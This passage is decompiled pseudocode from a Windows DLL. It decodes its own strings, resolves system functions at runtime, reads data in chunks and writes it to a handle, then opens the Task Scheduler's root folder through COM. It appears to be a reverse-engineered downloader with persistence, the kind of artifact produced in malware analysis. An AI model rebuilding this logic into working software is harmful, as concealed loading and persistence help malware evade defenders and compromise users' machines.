    "    v220 = -1073741824;",
    "    v99 = sub_10003490(v310);",
    "    hObject = (HANDLE)v98(v99);",
    "    sub_100017E0(v297);",
    "    sub_100017E0(lpProcName);",
    "    sub_10009D10(lpModuleName);",
    "    sub_100017E0(lpLibFileName);",
    "    sub_100017E0(v310);",
    "    sub_100017E0(Src);",
    "    LOBYTE(v369) = 25;",
    "    sub_100017E0(v299);",
    "  }",
    "  v100 = v275;",
    "  lpMultiByteStr = (LPCCH)&v213;",
    "  sub_10009E70((_DWORD *)&v210 + 1, *v275 + 144);",
    "  sub_1000B000(&v213, (_DWORD *)DWORD1(v210), SDWORD2(v210), SHIDWORD(v210), v211, HIDWORD(v211), v212);",
    "  LOBYTE(v369) = 39;",
    "  sub_10009E70((_DWORD *)&v210 + 1, *v100 + 444);",
    "  LOBYTE(v369) = 25;",
    "  sub_1000B970(",
    "    v312,",
    "    (_DWORD *)DWORD1(v210),",
    "    SDWORD2(v210),",
    "    SHIDWORD(v210),",
    "    v211,",
    "    SHIDWORD(v211),",
    "    v212,",
    "    v213,",
    "    v214,",
    "    v215,",
    "    (int)v216,",
    "    v217,",
    "    v218);",
    "  v101 = hLibModule;",
    "  v102 = v312;",
    "  LOBYTE(v369) = 40;",
    "  if ( v314 > 0xF )",
    "    v102 = (void **)v312[0];",
    "  v103 = (int (__stdcall *)())((int (__cdecl *)(HMODULE, void **))ProcAddress)(hLibModule, v102);",
    "  ProcAddress = v103;",
    "  if ( !v103 )",
    "  {",
    "    if ( v314 > 0xF )",
    "    {",
    "      v157 = v312[0];",
    "      v158 = (_DWORD *)(v314 + 1);",
    "      if ( v314 + 1 >= 0x1000 )",
    "      {",
    "        v157 = (void *)*((_DWORD *)v312[0] - 1);",
    "        v158 = (_DWORD *)(v314 + 36);",
    "        if ( (unsigned int)((char *)v312[0] - (char *)v157 - 4) > 0x1F )",
    "          goto LABEL_346;",
    "      }",
    "      v216 = v158;",
    "      sub_100154EB(v157);",
    "    }",
    "    v313 = 0;",
    "    v314 = 15;",
    "    LOBYTE(v312[0]) = 0;",
    "    goto LABEL_243;",
    "  }",
    "  while ( 1 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      memset(cbMultiByte, 0, 0x400u);",
    "      ((void (__cdecl *)(_DWORD **, char *, int, unsigned int *))v103)(v273, cbMultiByte, 1024, &v315);",
    "      if ( !v315 )",
    "      {",
    "        CloseHandle(hObject);",
    "        FreeLibrary(v101);",
    "        FreeLibrary(LibraryA);",
    "        if ( v314 > 0xF )",
    "        {",
    "          v104 = v312[0];",
    "          v105 = (const wchar_t *)(v314 + 1);",
    "          if ( v314 + 1 >= 0x1000 )",
    "          {",
    "            v104 = (void *)*((_DWORD *)v312[0] - 1);",
    "            v105 = (const wchar_t *)(v314 + 36);",
    "            if ( (unsigned int)((char *)v312[0] - (char *)v104 - 4) > 0x1F )",
    "              goto LABEL_346;",
    "          }",
    "          v212 = (int)v105;",
    "          sub_100154EB(v104);",
    "        }",
    "        v313 = 0;",
    "        v314 = 15;",
    "        LOBYTE(v312[0]) = 0;",
    "        if ( v324 > 0xF )",
    "        {",
    "          v106 = v322[0];",
    "          v107 = (const wchar_t *)(v324 + 1);",
    "          if ( v324 + 1 >= 0x1000 )",
    "          {",
    "            v106 = (void *)*((_DWORD *)v322[0] - 1);",
    "            v107 = (const wchar_t *)(v324 + 36);",
    "            if ( (unsigned int)((char *)v322[0] - (char *)v106 - 4) > 0x1F )",
    "              goto LABEL_346;",
    "          }",
    "          v212 = (int)v107;",
    "          sub_100154EB(v106);",
    "        }",
    "        v323 = 0;",
    "        v324 = 15;",
    "        LOBYTE(v322[0]) = 0;",
    "        if ( v330 > 0xF )",
    "        {",
    "          v108 = v328[0];",
    "          v109 = (const wchar_t *)(v330 + 1);",
    "          if ( v330 + 1 >= 0x1000 )",
    "          {",
    "            v108 = (void *)*((_DWORD *)v328[0] - 1);",
    "            v109 = (const wchar_t *)(v330 + 36);",
    "            if ( (unsigned int)((char *)v328[0] - (char *)v108 - 4) > 0x1F )",
    "              goto LABEL_346;",
    "          }",
    "          v212 = (int)v109;",
    "          sub_100154EB(v108);",
    "        }",
    "        v329 = 0;",
    "        v330 = 15;",
    "        LOBYTE(v328[0]) = 0;",
    "        if ( v363 > 0xF )",
    "        {",
    "          v110 = v361[0];",
    "          v111 = (const wchar_t *)(v363 + 1);",
    "          if ( v363 + 1 >= 0x1000 )",
    "          {",
    "            v110 = (void *)*((_DWORD *)v361[0] - 1);",
    "            v111 = (const wchar_t *)(v363 + 36);",
    "            if ( (unsigned int)((char *)v361[0] - (char *)v110 - 4) > 0x1F )",
    "              goto LABEL_346;",
    "          }",
    "          v212 = (int)v111;",
    "          sub_100154EB(v110);",
    "        }",
    "        v362 = 0;",
    "        v363 = 15;",
    "        LOBYTE(v361[0]) = 0;",
    "        sub_100017E0(v358);",
    "        sub_100017E0(v331);",
    "        sub_100017E0(v334);",
    "        sub_100017E0(v337);",
    "        sub_100017E0(v343);",
    "LABEL_153:",
    "        sub_100017E0(v352);",
    "        sub_100017E0(v340);",
    "        sub_100017E0(v349);",
    "        sub_10009D10(v346);",
    "        sub_100017E0(v355);",
    "        sub_10009D10(v317);",
    "        return 1;",
    "      }",
    "      if ( a2 )",
    "        break;",
    "      v303 = 0;",
    "      v304 = 0;",
    "      *(_OWORD *)v302 = 0;",
    "      sub_100018C0(v302, cbMultiByte, strlen(cbMultiByte));",
    "      LOBYTE(v369) = 41;",
    "      v114 = v302;",
    "      v115 = v302;",
    "      if ( v304 > 0xF )",
    "        v114 = (void **)v302[0];",
    "      v116 = (void **)((char *)v114 + v303);",
    "      if ( v304 > 0xF )",
    "        v115 = (void **)v302[0];",
    "      for ( ; v115 != v116; v115 = (void **)((char *)v115 + 1) )",
    "      {",
    "        if ( *(_BYTE *)v115 == 32 )",
    "          *(_BYTE *)v115 = 43;",
    "      }",
    "      sub_10009E70((_DWORD *)&v210 + 1, v302);",
    "      sub_1000AA30((int)v319, (CHAR *)DWORD1(v210), SDWORD2(v210), SHIDWORD(v210), v211, SHIDWORD(v211), v212);",
    "      LOBYTE(v369) = 42;",
    "      v117 = (const wchar_t *)v319;",
    "      v212 = (int)\"?\";",
    "      if ( v321 > 7 )",
    "        v117 = v319[0];",
    "      if ( wcsstr(v117, (const wchar_t *)v212) )",
    "      {",
    "        v212 = 63;",
    "        v327 = 0;",
    "        *(_QWORD *)v326 = 0;",
    "        sub_10009D70((size_t *)&v210, v319);",
    "        sub_10011AC0((int)v326, v210, v211, v212);",
    "        LOBYTE(v369) = 43;",
    "        v118 = v326[0];",
    "        v119 = (char *)v326[1] - (char *)v326[0];",
    "        if ( (unsigned int)(((char *)v326[1] - (char *)v326[0]) / 24) > 1 )",
    "        {",
    "          sub_10009D70((size_t *)v283, (_DWORD *)v326[0] + 6);",
    "          LOBYTE(v369) = 45;",
    "          v120 = v283;",
    "          v121 = (_DWORD *)sub_1001E025();",
    "          if ( v284 > 7 )",
    "            v120 = (void **)v283[0];",
    "          v212 = 10;",
    "          v211 = __PAIR64__(&v282, (unsigned int)v120);",
    "          *v121 = 0;",
    "          v122 = sub_1001E65D(v211, HIDWORD(v211), v212);",
    "          if ( v120 == (void **)v282 )",
    "            sub_10014CB2(\"invalid stoi argument\");",
    "          if ( *v121 == 34 )",
    "            sub_10014CF2(\"stoi argument out of range\");",
    "          v118 = v326[0];",
    "          v123 = (double)v122;",
    "          if ( (double)v122 > 100.0 )",
    "          {",
    "            v124 = v326[0];",
    "            if ( *((_DWORD *)v326[0] + 5) > 7u )",
    "              v124 = *(_BYTE **)v326[0];",
    "            v277 = (void *)*((_DWORD *)v326[0] + 4);",
    "            v125 = v277;",
    "            v126 = (int)v277;",
    "            if ( (unsigned int)v277 > 3 )",
    "              v126 = 3;",
    "            v127 = L\"TPL\";",
    "            if ( v126 )",
    "            {",
    "              v128 = v124 - (_BYTE *)L\"TPL\";",
    "              while ( *(const wchar_t *)((char *)v127 + v128) == *v127 )",
    "              {",
    "                ++v127;",
    "                if ( !--v126 )",
    "                {",
    "                  v125 = v277;",
    "                  goto LABEL_187;",
    "                }",
    "              }",
    "            }",
    "            else",
    "            {",
    "LABEL_187:",
    "              if ( v125 == (void *)3 )",
    "              {",
    "                *v269 = 1;",
    "                *v271 = v123;",
    "              }",
    "            }",
    "          }",
    "          v369 = 43;",
    "          v119 = v284;",
    "          if ( v284 > 7 )",
    "          {",
    "            v129 = v283[0];",
    "            v130 = (const wchar_t *)(2 * v284 + 2);",
    "            if ( (unsigned int)v130 >= 0x1000 )",
    "            {",
    "              v129 = (void *)*((_DWORD *)v283[0] - 1);",
    "              v130 = (const wchar_t *)(2 * v284 + 37);",
    "              if ( (unsigned int)((char *)v283[0] - (char *)v129 - 4) > 0x1F )",
    "                _invalid_parameter_noinfo_noreturn();",
    "            }",
    "            v212 = (int)v130;",
    "            sub_100154EB(v129);",
    "            v118 = v326[0];",
    "          }",
    "          v103 = ProcAddress;",
    "        }",
    "        LOBYTE(v369) = 42;",
    "        if ( v118 )",
    "        {",
    "          sub_10014490(v119);",
    "          v131 = v326[0];",
    "          v132 = 24 * ((int)(v327 - (unsigned int)v326[0]) / 24);",
    "          if ( v132 >= 0x1000 )",
    "          {",
    "            v131 = (void *)*((_DWORD *)v326[0] - 1);",
    "            v132 += 35;",
    "            if ( (unsigned int)((char *)v326[0] - (char *)v131 - 4) > 0x1F )",
    "              _invalid_parameter_noinfo_noreturn();",
    "          }",
    "          v212 = v132;",
    "          sub_100154EB(v131);",
    "          v326[0] = 0;",
    "          v326[1] = 0;",
    "          v327 = 0;",
    "        }",
    "      }",
    "      LOBYTE(v369) = 41;",
    "      if ( v321 > 7 )",
    "      {",
    "        v133 = (WCHAR *)v319[0];",
    "        v134 = (const wchar_t *)(2 * v321 + 2);",
    "        if ( (unsigned int)v134 >= 0x1000 )",
    "        {",
    "          v133 = (WCHAR *)*((_DWORD *)v319[0] - 1);",
    "          v134 = (const wchar_t *)(2 * v321 + 37);",
    "          if ( (unsigned int)((char *)v319[0] - (char *)v133 - 4) > 0x1F )",
    "LABEL_351:",
    "            _invalid_parameter_noinfo_noreturn();",
    "        }",
    "        v212 = (int)v134;",
    "        sub_100154EB(v133);",
    "      }",
    "      v101 = hLibModule;",
    "      LOBYTE(v369) = 40;",
    "      v320 = 0;",
    "      v321 = 7;",
    "      LOWORD(v319[0]) = 0;",
    "      if ( v304 > 0xF )",
    "      {",
    "        v135 = v302[0];",
    "        v136 = (const wchar_t *)(v304 + 1);",
    "        if ( v304 + 1 >= 0x1000 )",
    "        {",
    "          v135 = (void *)*((_DWORD *)v302[0] - 1);",
    "          v136 = (const wchar_t *)(v304 + 36);",
    "          if ( (unsigned int)((char *)v302[0] - (char *)v135 - 4) > 0x1F )",
    "            goto LABEL_351;",
    "        }",
    "        v212 = (int)v136;",
    "        sub_100154EB(v135);",
    "        v101 = hLibModule;",
    "      }",
    "    }",
    "    *v271 = (double)v315 + *v271;",
    "    v137 = (_DWORD *)sub_10002FE0();",
    "    lpMultiByteStr = (char *)&v210 + 4;",
    "    sub_10009E70(&v205, v137);",
    "    sub_1000B000((_DWORD *)&v210 + 1, v205, v206, v207, v208, v209, v210);",
    "    LOBYTE(v369) = 47;",
    "    sub_10009E70(&v205, v137 + 186);",
    "    LOBYTE(v369) = 40;",
    "    sub_1000B970(",
    "      v287,",
    "      v205,",
    "      v206,",
    "      v207,",
    "      v208,",
    "      v209,",
    "      v210,",
    "      (_DWORD *)DWORD1(v210),",
    "      SDWORD2(v210),",
    "      SHIDWORD(v210),",
    "      v211,",
    "      SHIDWORD(v211),",
    "      v212);",
    "    LOBYTE(v369) = 48;",
    "    sub_10009E70((_DWORD *)&v210 + 1, v287);",
    "    sub_1000AA30((int)v319, (CHAR *)DWORD1(v210), SDWORD2(v210), SHIDWORD(v210), v211, SHIDWORD(v211), v212);",
    "    LOBYTE(v369) = 49;",
    "    lpMultiByteStr = (char *)&v210 + 4;",
    "    sub_10009E70(&v205, v137 + 6);",
    "    sub_1000B000((_DWORD *)&v210 + 1, v205, v206, v207, v208, v209, v210);",
    "    LOBYTE(v369) = 50;",
    "    sub_10009E70(&v205, v137 + 192);",
    "    LOBYTE(v369) = 49;",
    "    sub_1000B970(",
    "      v291,",
    "      v205,",
    "      v206,",
    "      v207,",
    "      v208,",
    "      v209,",
    "      v210,",
    "      (_DWORD *)DWORD1(v210),",
    "      SDWORD2(v210),",
    "      SHIDWORD(v210),",
    "      v211,",
    "      SHIDWORD(v211),",
    "      v212);",
    "    LOBYTE(v369) = 51;",
    "    v138 = (const WCHAR *)v319;",
    "    v139 = v291;",
    "    if ( v321 > 7 )",
    "      v138 = v319[0];",
    "    if ( v292 > 0xF )",
    "      v139 = (LPCSTR *)v291[0];",
    "    v212 = (int)v139;",
    "    v140 = GetModuleHandleW(v138);",
    "    v141 = GetProcAddress(v140, (LPCSTR)v212);",
    "    v142 = (const CHAR *)v287;",
    "    v277 = v141;",
    "    if ( v288 > 0xF )",
    "      v142 = v287[0];",
    "    v272 = LoadLibraryA(v142);",
    "    lpMultiByteStr = (char *)&v210 + 4;",
    "    sub_10009E70(&v205, v137 + 30);",
    "    sub_1000B000((_DWORD *)&v210 + 1, v205, v206, v207, v208, v209, v210);",
    "    LOBYTE(v369) = 52;",
    "    sub_10009E70(&v205, v137 + 216);",
    "    LOBYTE(v369) = 51;",
    "    sub_1000B970(",
    "      v285,",
    "      v205,",
    "      v206,",
    "      v207,",
    "      v208,",
    "      v209,",
    "      v210,",
    "      (_DWORD *)DWORD1(v210),",
    "      SDWORD2(v210),",
    "      SHIDWORD(v210),",
    "      v211,",
    "      SHIDWORD(v211),",
    "      v212);",
    "    LOBYTE(v369) = 53;",
    "    if ( !v272 )",
    "      goto LABEL_237;",
    "    v143 = v275;",
    "    lpMultiByteStr = (char *)&v210 + 4;",
    "    sub_10009E70(&v205, *v275 + 36);",
    "    sub_1000B000((_DWORD *)&v210 + 1, v205, v206, v207, v208, v209, v210);",
    "    LOBYTE(v369) = 54;",
    "    sub_10009E70(&v205, *v143 + 222);",
    "    LOBYTE(v369) = 53;",
    "    sub_1000B970(",
    "      v289,",
    "      v205,",
    "      v206,",
    "      v207,",
    "      v208,",
    "      v209,",
    "      v210,",
    "      (_DWORD *)DWORD1(v210),",
    "      SDWORD2(v210),",
    "      SHIDWORD(v210),",
    "      v211,",
    "      SHIDWORD(v211),",
    "      v212);",
    "    v144 = v272;",
    "    v145 = v289;",
    "    LOBYTE(v369) = 55;",
    "    if ( v290 > 0xF )",
    "      v145 = (void **)v289[0];",
    "    v146 = (void (__cdecl *)(HANDLE, char *, unsigned int, CHAR ***, _DWORD))((int (__cdecl *)(HMODULE, void **))v277)(",
    "                                                                               v272,",
    "                                                                               v145);",
    "    if ( !v146 )",
    "      break;",
    "    v146(hObject, cbMultiByte, v315, &v364, 0);",
    "    LOBYTE(v369) = 53;",
    "    if ( v290 > 0xF )",
    "    {",
    "      v147 = v289[0];",
    "      v148 = v290 + 1;",
    "      if ( v290 + 1 >= 0x1000 )",
    "      {",
    "        v147 = (void *)*((_DWORD *)v289[0] - 1);",
    "        v148 = v290 + 36;",
    "        if ( (unsigned int)((char *)v289[0] - (char *)v147 - 4) > 0x1F )",
    "          _invalid_parameter_noinfo_noreturn();",
    "      }",
    "      v209 = v148;",
    "      sub_100154EB(v147);",
    "    }",
    "    LOBYTE(v369) = 51;",
    "    if ( v286 > 0xF )",
    "    {",
    "      v149 = v285[0];",
    "      v150 = v286 + 1;",
    "      if ( v286 + 1 >= 0x1000 )",
    "      {",
    "        v149 = (void *)*((_DWORD *)v285[0] - 1);",
    "        v150 = v286 + 36;",
    "        if ( (unsigned int)((char *)v285[0] - (char *)v149 - 4) > 0x1F )",
    "LABEL_353:",
    "          _invalid_parameter_noinfo_noreturn();",
    "      }",
    "      v209 = v150;",
    "      sub_100154EB(v149);",
    "    }",
    "    LOBYTE(v369) = 49;",
    "    v285[4] = 0;",
    "    v286 = 15;",
    "    LOBYTE(v285[0]) = 0;",
    "    if ( v292 > 0xF )",
    "    {",
    "      v151 = (CHAR *)v291[0];",
    "      v152 = v292 + 1;",
    "      if ( v292 + 1 >= 0x1000 )",
    "      {",
    "        v151 = (CHAR *)*((_DWORD *)v291[0] - 1);",
    "        v152 = v292 + 36;",
    "        if ( (unsigned int)(v291[0] - (LPCSTR)v151 - 4) > 0x1F )",
    "          goto LABEL_353;",
    "      }",
    "      v209 = v152;",
    "      sub_100154EB(v151);",
    "    }",
    "    LOBYTE(v369) = 48;",
    "    v291[4] = 0;",
    "    v292 = 15;",
    "    LOBYTE(v291[0]) = 0;",
    "    if ( v321 > 7 )",
    "    {",
    "      v153 = (WCHAR *)v319[0];",
    "      v154 = 2 * v321 + 2;",
    "      if ( v154 >= 0x1000 )",
    "      {",
    "        v153 = (WCHAR *)*((_DWORD *)v319[0] - 1);",
    "        v154 = 2 * v321 + 37;",
    "        if ( (unsigned int)((char *)v319[0] - (char *)v153 - 4) > 0x1F )",
    "          goto LABEL_353;",
    "      }",
    "      v209 = v154;",
    "      sub_100154EB(v153);",
    "    }",
    "    v101 = hLibModule;",
    "    v103 = ProcAddress;",
    "    LOBYTE(v369) = 40;",
    "    v320 = 0;",
    "    v321 = 7;",
    "    LOWORD(v319[0]) = 0;",
    "    if ( v288 > 0xF )",
    "    {",
    "      v155 = (CHAR *)v287[0];",
    "      v156 = v288 + 1;",
    "      if ( v288 + 1 >= 0x1000 )",
    "      {",
    "        v155 = (CHAR *)*((_DWORD *)v287[0] - 1);",
    "        v156 = v288 + 36;",
    "        if ( (unsigned int)(v287[0] - (LPCSTR)v155 - 4) > 0x1F )",
    "          goto LABEL_353;",
    "      }",
    "      v209 = v156;",
    "      sub_100154EB(v155);",
    "      v101 = hLibModule;",
    "      v103 = ProcAddress;",
    "    }",
    "  }",
    "  CloseHandle(hObject);",
    "  FreeLibrary(v144);",
    "  sub_100017E0(v289);",
    "LABEL_237:",
    "  sub_100017E0(v285);",
    "  sub_100017E0(v291);",
    "  sub_10009D10(v319);",
    "  sub_100017E0(v287);",
    "  v113 = v312;",
    "LABEL_155:",
    "  sub_100017E0(v113);",
    "  sub_100017E0(v322);",
    "  sub_100017E0(v328);",
    "  sub_100017E0(v361);",
    "  sub_100017E0(v358);",
    "LABEL_156:",
    "  sub_100017E0(v331);",
    "  sub_100017E0(v334);",
    "LABEL_157:",
    "  sub_100017E0(v337);",
    "LABEL_158:",
    "  sub_100017E0(v343);",
    "  sub_100017E0(v352);",
    "  sub_100017E0(v340);",
    "  sub_100017E0(v349);",
    "  sub_10009D10(v346);",
    "  sub_100017E0(v355);",
    "  sub_10009D10(v317);",
    "  return 0;",
    "}",
    "",
    "",
    "int __stdcall sub_10014450(_DWORD *Block, int a2)",
    "{",
    "  void *v2; // ecx",
    "",
    "  v2 = Block;",
    "  if ( (unsigned int)(24 * a2) >= 0x1000 )",
    "  {",
    "    if ( (unsigned int)Block - *(Block - 1) - 4 > 0x1F )",
    "      _invalid_parameter_noinfo_noreturn();",
    "    v2 = (void *)*(Block - 1);",
    "  }",
    "  return sub_100154EB(v2);",
    "}",
    "",
    "",
    "void __fastcall sub_10014490(int a1, int a2)",
    "{",
    "  int i; // esi",
    "  unsigned int v4; // ecx",
    "  _DWORD *v5; // eax",
    "",
    "  for ( i = a1; i != a2; i += 24 )",
    "  {",
    "    v4 = *(_DWORD *)(i + 20);",
    "    if ( v4 > 7 )",
    "    {",
    "      v5 = *(_DWORD **)i;",
    "      if ( 2 * v4 + 2 >= 0x1000 )",
    "      {",
    "        if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )",
    "          _invalid_parameter_noinfo_noreturn();",
    "        v5 = (_DWORD *)*(v5 - 1);",
    "      }",
    "      sub_100154EB(v5);",
    "    }",
    "    *(_DWORD *)(i + 16) = 0;",
    "    *(_DWORD *)(i + 20) = 7;",
    "    *(_WORD *)i = 0;",
    "  }",
    "}",
    "",
    "",
    "size_t *__thiscall sub_10014500(int *this, int a2, _DWORD *a3)",
    "{",
    "  int v4; // esi",
    "  int v5; // ecx",
    "  unsigned int v6; // ebx",
    "  unsigned int v7; // ecx",
    "  unsigned int v8; // eax",
    "  unsigned int v9; // ecx",
    "  unsigned int v10; // ebx",
    "  char *v11; // esi",
    "  void *v12; // eax",
    "  void *v13; // eax",
    "  int v14; // eax",
    "  int v15; // ecx",
    "  size_t *result; // eax",
    "  char *v17; // [esp-8h] [ebp-44h]",
    "  int v18; // [esp+0h] [ebp-3Ch] BYREF",
    "  size_t *v19; // [esp+10h] [ebp-2Ch]",
    "  int v20; // [esp+14h] [ebp-28h]",
    "  _DWORD *v21; // [esp+18h] [ebp-24h]",
    "  int v22; // [esp+1Ch] [ebp-20h]",
    "  int v23; // [esp+20h] [ebp-1Ch]",
    "  void *Block; // [esp+24h] [ebp-18h]",
    "  int v25; // [esp+28h] [ebp-14h]",
    "  int *v26; // [esp+2Ch] [ebp-10h]",
    "  int v27; // [esp+38h] [ebp-4h]",
    "",
    "  v26 = &v18;",
    "  v4 = *this;",
    "  v23 = a2;",
    "  v21 = a3;",
    "  v5 = this[1] - v4;",
    "  v25 = (a2 - v4) / 24;",
    "  v20 = v5 / 24;",
    "  if ( v5 / 24 == 178956970 )",
    "    sub_10003530(v5, (int)((unsigned __int64)(715827883LL * v5) >> 32) >> 2);",
    "  v6 = v5 / 24 + 1;",
    "  v7 = (this[2] - v4) / 24;",
    "  if ( v7 > 178956970 - (v7 >> 1) )",
    "    goto LABEL_21;",
    "  v8 = (v7 >> 1) + v7;",
    "  v9 = v6;",
    "  if ( v8 >= v6 )",
    "    v9 = v8;",
    "  if ( v9 > 0xAAAAAAA )",
    "    goto LABEL_21;",
    "  v22 = v9;",
    "  v10 = 24 * v9;",
    "  if ( !(24 * v9) )",
    "  {",
    "    v11 = 0;",
    "    v22 = v9;",
    "    Block = 0;",
    "    goto LABEL_13;",
    "  }",
    "  if ( v10 < 0x1000 )",
    "  {",
    "    Block = operator new(24 * v9);",
    "    v11 = (char *)Block;",
    "    goto LABEL_13;",
    "  }",
    "  if ( v10 + 35 < v10 )",
    "LABEL_21:",
    "    sub_100014A0(v18);",
    "  v12 = operator new(v10 + 35);",
    "  if ( !v12 )",
    "    goto LABEL_23;",
    "  v11 = (char *)(((unsigned int)v12 + 35) & 0xFFFFFFE0);",
    "  Block = v11;",
    "  *((_DWORD *)v11 - 1) = v12;",
    "LABEL_13:",
    "  v27 = 0;",
    "  v19 = (size_t *)&v11[24 * v25];",
    "  v25 = (int)(v19 + 6);",
    "  sub_10009D70(v19, v21);",
    "  v17 = v11;",
    "  if ( v23 != this[1] )",
    "  {",
    "    sub_10014720(v11);",
    "    v17 = (char *)v25;",
    "  }",
    "  sub_10014720(v17);",
    "  if ( *this )",
    "  {",
    "    sub_10014490(*this, this[1]);",
    "    v13 = (void *)*this;",
    "    if ( (unsigned int)(24 * ((this[2] - *this) / 24)) < 0x1000 )",
    "    {",
    "LABEL_19:",
    "      sub_100154EB(v13);",
    "      goto LABEL_20;",
    "    }",
    "    if ( (unsigned int)v13 - *((_DWORD *)v13 - 1) - 4 <= 0x1F )",
    "    {",
    "      v13 = (void *)*((_DWORD *)v13 - 1);",
    "      goto LABEL_19;",
    "    }",
    "LABEL_23:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "LABEL_20:",
    "  v14 = v20 + 1;",
    "  *this = (int)v11;",
    "  v15 = 3 * v14;",
    "  result = v19;",
    "  this[1] = (int)&v11[8 * v15];",
    "  this[2] = (int)&v11[v10];",
    "  return result;",
    "}",
    "",
    "",
    "int __fastcall sub_10014720(int a1, int a2, int a3)",
    "{",
    "  int v3; // esi",
    "  int v4; // eax",
    "",
    "  v3 = a3;",
    "  if ( a1 != a2 )",
    "  {",
    "    v4 = a3 - a1;",
    "    do",
    "    {",
    "      *(_OWORD *)v3 = 0;",
    "      *(_DWORD *)(v3 + 16) = 0;",
    "      *(_DWORD *)(a1 + v4 + 20) = 0;",
    "      *(_OWORD *)v3 = *(_OWORD *)a1;",
    "      *(_QWORD *)(v3 + 16) = *(_QWORD *)(a1 + 16);",
    "      v3 += 24;",
    "      *(_DWORD *)(a1 + 16) = 0;",
    "      *(_DWORD *)(a1 + 20) = 7;",
    "      *(_WORD *)a1 = 0;",
    "      a1 += 24;",
    "    }",
    "    while ( a1 != a2 );",
    "  }",
    "  sub_10014490(v3, v3);",
    "  return v3;",
    "}",
    "",
    "",
    "int __thiscall sub_10014790(int *this)",
    "{",
    "  int v2; // esi",
    "  int result; // eax",
    "",
    "  v2 = *this;",
    "  if ( *this )",
    "  {",
    "    result = _InterlockedDecrement((volatile signed __int32 *)(v2 + 8));",
    "    if ( !result )",
    "    {",
    "      if ( *(_DWORD *)v2 )",
    "      {",
    "        SysFreeString(*(BSTR *)v2);",
    "        *(_DWORD *)v2 = 0;",
    "      }",
    "      if ( *(_DWORD *)(v2 + 4) )",
    "      {",
    "        j_j_j___free_base(*(void **)(v2 + 4));",
    "        *(_DWORD *)(v2 + 4) = 0;",
    "      }",
    "      result = sub_100154EB((void *)v2);",
    "    }",
    "    *this = 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "char __stdcall sub_10014800(OLECHAR *psz, int a2, int a3, int a4, int a5, unsigned int a6)",
    "{",
    "  int v6; // ecx",
    "  OLECHAR *v7; // edx",
    "  volatile signed __int32 *v8; // eax",
    "  volatile signed __int32 *v9; // esi",
    "  BSTR v10; // eax",
    "  void *v11; // eax",
    "  const OLECHAR *p_psz; // edi",
    "  volatile signed __int32 *v13; // eax",
    "  volatile signed __int32 *v14; // esi",
    "  BSTR v15; // eax",
    "  LPVOID v17; // [esp-4h] [ebp-A4h]",
    "  VARIANTARG v18; // [esp+Ch] [ebp-94h]",
    "  VARIANTARG v19; // [esp+1Ch] [ebp-84h]",
    "  VARIANTARG v20; // [esp+2Ch] [ebp-74h]",
    "  VARIANTARG pvarg; // [esp+3Ch] [ebp-64h] BYREF",
    "  VARIANTARG v22; // [esp+4Ch] [ebp-54h] BYREF",
    "  VARIANTARG v23; // [esp+5Ch] [ebp-44h] BYREF",
    "  VARIANTARG v24; // [esp+6Ch] [ebp-34h] BYREF",
    "  void *v25; // [esp+7Ch] [ebp-24h]",
    "  void *Block; // [esp+80h] [ebp-20h]",
    "  char v27; // [esp+87h] [ebp-19h]",
    "  int v28; // [esp+88h] [ebp-18h] BYREF",
    "  LPVOID ppv; // [esp+8Ch] [ebp-14h] BYREF",
    "  int v30; // [esp+9Ch] [ebp-4h]",
    "",
    "  v30 = 0;",
    "  if ( CoInitialize(0) < 0 )",
    "    goto LABEL_7;",
    "  if ( CoCreateInstance(&rclsid, 0, 1u, &riid, &ppv) < 0 )",
    "  {",
    "LABEL_6:",
    "    CoUninitialize();",
    "LABEL_7:",
    "    v27 = 0;",
    "    goto LABEL_8;",
    "  }",
    "  VariantInit(&pvarg);",
    "  v20 = pvarg;",
    "  VariantInit(&v22);",
    "  v19 = v22;",
    "  VariantInit(&v23);",
    "  v18 = v23;",
    "  VariantInit(&v24);",
    "  LOBYTE(v30) = 4;",
    "  Block = (void *)((unsigned int)(*(int (__stdcall **)(LPVOID, _DWORD, ULONG, LONG, LONG, _DWORD, ULONG, LONG, LONG, _DWORD, ULONG, LONG, LONG, _DWORD, ULONG, LONG, LONG))(*(_DWORD *)ppv + 40))(",
    "                                   ppv,",
    "                                   *(_DWORD *)&v24.vt,",
    "                                   v24.decVal.Hi32,",
    "                                   v24.lVal,",
    "                                   v24.cyVal.Hi,",
    "                                   *(_DWORD *)&v18.vt,",
    "                                   v18.decVal.Hi32,",
    "                                   v18.lVal,",
    "                                   v18.cyVal.Hi,",
    "                                   *(_DWORD *)&v19.vt,",
    "                                   v19.decVal.Hi32,",
    "                                   v19.lVal,",
    "                                   v19.cyVal.Hi,",
    "                                   *(_DWORD *)&v20.vt,",
    "                                   v20.decVal.Hi32,",
    "                                   v20.lVal,",
    "                                   v20.cyVal.Hi) >> 31);",
    "  VariantClear(&v24);",
    "  VariantClear(&v23);",
    "  VariantClear(&v22);",
    "  LOBYTE(v30) = 0;",
    "  VariantClear(&pvarg);",
    "  if ( (_BYTE)Block )",
    "  {",
    "    v17 = ppv;",
    "    v6 = *(_DWORD *)ppv;",
    "LABEL_5:",
    "    (*(void (__stdcall **)(LPVOID))(v6 + 8))(v17);",
    "    goto LABEL_6;",
    "  }",
    "  v8 = (volatile signed __int32 *)operator new(0xCu);",
    "  v9 = v8;",
    "  Block = (void *)v8;",
    "  LOBYTE(v30) = 5;",
    "  if ( v8 )",
    "  {",
    "    *(_QWORD *)v8 = 0;",
    "    *((_DWORD *)v8 + 2) = 0;",
    "    *((_DWORD *)v8 + 1) = 0;",
    "    *((_DWORD *)v8 + 2) = 1;",
    "    v10 = SysAllocString(L\"\\\\\");",
    "    *v9 = (volatile signed __int32)v10;",
    "    if ( !v10 )",
    "      goto LABEL_43;",
    "  }",
    "  else",
    "  {",
    "    v9 = 0;",
    "  }",
    "  LOBYTE(v30) = 0;",
    "  Block = (void *)v9;",
    "  if ( !v9 )",
    "    goto LABEL_43;",
    "  LOBYTE(v30) = 6;",
    "  v11 = (void *)((unsigned int)(*(int (__stdcall **)(LPVOID, volatile signed __int32, int *))(*(_DWORD *)ppv + 28))(",
    "                                 ppv,",
    "                                 *v9,",
    "                                 &v28) >> 31);",
    "  Block = v11;",
    "  LOBYTE(v30) = 0;",
    "  if ( !_InterlockedDecrement(v9 + 2) )",
    "  {",
    "    if ( *v9 )",
    "    {",
    "      SysFreeString(*(BSTR *)v9);",
    "      *v9 = 0;",
    "    }",
